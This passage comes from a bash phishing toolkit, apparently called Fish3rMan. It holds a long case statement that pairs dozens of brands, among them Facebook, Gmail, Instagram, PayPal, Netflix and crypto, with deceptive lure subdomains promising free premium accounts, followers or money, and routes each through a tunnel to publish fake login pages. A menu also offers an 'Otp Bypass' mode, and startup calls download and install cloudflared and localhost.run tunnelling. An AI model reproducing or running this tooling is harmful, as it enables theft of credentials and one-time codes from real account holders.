			tunnel;;	
			
			
		14)
			site="facebook_messenger"
			subdomain='http://messenger-premium-features-for-free'
			tunnel;; 	
			
          
        15)
            site="facebook_security"
			subdomain='http://make-your-facebook-secured-from-hackers'
			tunnel;;  

	     
	    16)		
	 		site="gmail"
			subdomain='http://get-unlimited-google-drive-free'
			tunnel;;
			
			
	    17)		
	 		site="goodreads"
			subdomain='http://goodreads-updrade-account-lifetime-free'
			tunnel;;
	   		
	   		
	    18)
			site="hotstar"
			subdomain='http://hotstar-premieum-account-for-free'
			tunnel;;		
	   		
	   	
	   	19)
			site="icloud"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;		
	   	
	   	
	   	20)
			site="influenster"
			subdomain='http://update-account-to-premium-free'
			tunnel;;		
	   	
	   		
	    21)
			site="instagram"
			subdomain='http://secure-login-for-instagram'
			tunnel;;
			
			
	    22)
		    site="instagram_followers"
			subdomain='http://get-10000-followers-for-instagram'
			tunnel;;			
			
	 
	    23)
			site="instagram_followers_2"
			subdomain='http://get-10000-followers-for-instagram'
			tunnel;;		
		
		
	    24)
			site="instagram_verify"
			subdomain='http://instagram-verify-account'
			tunnel;;
			
			
	    25)
			site="line"
			subdomain='http://line-get-free-tokens-for-speech'
			tunnel;;
					
			
	    26)
			site="linkedin"
			subdomain='http://get-a-premium-plan-for-linkedin-free'
			tunnel;;
		
		
	    27)
			site="livejournal"
			subdomain='http://get-a-premium-plan-for-livejournal-free'
			tunnel;;
		
		
		28) 
            site="mediafire"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;
		
		
		29)
			site="mewe"
			subdomain='http://mewe-update-account-to-premium-free'
			tunnel;;		
	   	
			
	   30) 
            site="microsoft"
			subdomain='http://unlimited-onedrive-space-for-free'
			tunnel;;	
		
	   31)  
	        site="mocospace"
			subdomain='http://upgrade-your-mocospace-plan-free'
			tunnel;;
		
			
	   32)  
	        site="myspace"
			subdomain='http://upgrade-your-myspace-plan-free'
			tunnel;;
			
		
	   33)
	        site="netflix"
			subdomain='http://upgrade-your-netflix-plan-free'
			tunnel;;	
			
	   34)
	        site="origin"
			subdomain='http://origin-upgrade-to-premium-account-free'
			tunnel;;	
		
		
	   35)  
	        site="outlook"
			subdomain='http://unlimited-onedrive-space-for-free'
			tunnel;;	
			
	   36)  
	        site="pinterest"
			subdomain='http://get-a-premium-plan-for-pinterest-free'
			tunnel;;	
			
	
	   37)  
	        site="playstation"
			subdomain='http://playstation-premium-account-free'
			tunnel;;		
				
					
       38)  
	        site="protonmail"
			subdomain='http://protonmail-pro-basics-for-free'
			tunnel;;
		
		
	   39)  
	        site="pubg"
			subdomain='http://get-free-character-for-pubs-game'
			tunnel;;	
			
			
	   40)  
	        site="quora"
			subdomain='http://get-quora-premium-account-for-free-lifetime'
			tunnel;;	
			
			
	   41)  
	        site="raverly"
			subdomain='http://get-raverly-premium-account-for-free-'
			tunnel;;	
			
			
	   42)  
	        site="reddit"
			subdomain='http://reddit-official-verified-member-badge'
			tunnel;;		
				
				
	   43)  
	        site="reverbnation"
			subdomain='http://get-reverbnation-premium-account-for-free-'
			tunnel;;	
		
		
	   44)
			site="signal"
			subdomain='http://signal-get-free-tokens-for-speech'
			tunnel;;	
		
		
	   45)
			site="skype"
			subdomain='http://skype-get-free-tokens-for-speech'
			tunnel;;	
		
		
	   46)
	        site="skyrock"
			subdomain='http://skyrock-upgrade-to-premium-account-free'
			tunnel;;	
				
					
       47)  
	        site="snapchat"
			subdomain='http://view-locked-snapchat-accounts-secretly'
			tunnel;;
		
	   48)  
	        site="socialclub"
			subdomain='http://-socialclub-update-account-to-premieum-free'
			tunnel;;		
		
			
	   49)  
	        site="spotify"
			subdomain='http://convert-your-account-to-spotify-premium'
			tunnel;;		
		
		
	   50)  
	        site="stackoverflow"
			subdomain='http://stackoverflow-convert-your-account-to-premium'
			tunnel;;		
			
		
	   51)  
	        site="steam"
			subdomain='http://steam-convert-your-account-to-premium'
			tunnel;;		
				
	   52)  
	        site="tagget"
			subdomain='http://tagget-convert-your-account-to-premium'
			tunnel;;		
		
			
	   53)  
	        site="telegram"
			subdomain='http://telegram-get-free-tokens-for-speech'
			tunnel;;	
	
	
	   54)  
	        site="tiktok"
			subdomain='http://get-tiktok-100000-followers-free-at-instant'
			tunnel;;
	
			
	   55)  
	        site="tiktok_followers"
			subdomain='http://get-tiktok-100000-followers-free-at-instant'
			tunnel;;
					
		
	   56)  
	        site="tumblr"
			subdomain='http://tumblr-upgrade-account-to-premium-free'
			tunnel;;
		
					
       57)  
	        site="twitch"
			subdomain='http://unlimited-twitch-tv-user-for-free'
			tunnel;;
			
			
	   58)  
	        site="twitter"
			subdomain='http://get-blue-badge-on-twitter-free'
			tunnel;;									
		
		
	   59)  
	        site="viber_out"
			subdomain='http://viber-get-free-tokens-for-speech'
			tunnel;;	
		
		
	   60)  
	        site="vimeo"
			subdomain='http://get-100000-views-for-channel-free'
			tunnel;;
		
			
			
	   61)  
	        site="vk"
			subdomain='http://vk-premium-real-method-2022-free'
			tunnel;;		
			
					
       62)  
	        site="whatsapp"
			subdomain='http://get-live-new-stickers'
			tunnel;;
			
			
	   63)  
	        site="wordpress"
			subdomain='http://get-unlimited-wordpress-traffic-free'
			tunnel;;
	 	
	 	
	   64)  
	        site="xanga"
			subdomain='http://xanga-update-account-to-premieum'
			tunnel;;	
	 	
	 	
	   65)  
	        site="xbox"
			subdomain='http://xbox-premium-account-new-method-2022'
			tunnel;;
		
	  
	   66)  
	        site="xing"
			subdomain='http://xing-update-account-to-premieum'
			tunnel;;	
	 		
				
	 		
	   67)  
	        site="yahoo"
			subdomain='http://grab-mail-from-anyother-yahoo-account-free'
			tunnel;;
			
	   68)  
	        site="yandex"
			subdomain='http://grab-mail-from-anyother-yandex-account-free'
			tunnel;;		
		
	   
	   69)  
	        site="youtube_subs"
			subdomain='http://get-100000-youtube-subscribers-free'
			tunnel;;
			
			
		70)  
	        site="paypal"
			subdomain='http://send-money-redeem-cashback-offer100'
			tunnel;;
			
		71)  
	        site="google_poll"
			subdomain='http://vote-to-google-for-social-media'
			tunnel;;
			
		72)  
	        site="cryptocurrency"
			subdomain='http://signup-get-10-bitcoin-for-free'
			tunnel;;
			
		73)  
	        site="github"
			subdomain='http://github.com/ghosthub/Hack-iPhone10.git'
			tunnel;;
			
		74)  
	        site="gitlab"
			subdomain='http://github.com/ghosthub/Pegasus.git'
			tunnel;;


	   *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; attack;};;
	  
	esac

}

menu() {
 
 { clear; header; echo; }
printf "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m"
echo "
+---------+----------+---------+------------+
| Options | Activity | Options |  Activity  |
+---------+----------+---------+------------+
|    1    |  Normal  |    2    | Otp Bypass |
+---------+----------+---------+------------+
|    3    |  About   |    4    | Exit/Quit  |
+---------+----------+---------+------------+
"
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) attack;; 
	    
	    2) otp_bypass;; 
	    
	    3) about;;
	    
		4)
		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using Fish3rMan "${WHITE}
		sleep 2
		clear
		exit 1;;
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...$RESET"
			{ sleep 0.7; menu;};;
	  
	esac
	
}	

check_avl_pkg
cloudflared_download_and_install
localhostrun_download_and_install
execute_parm
pid_kill
menu
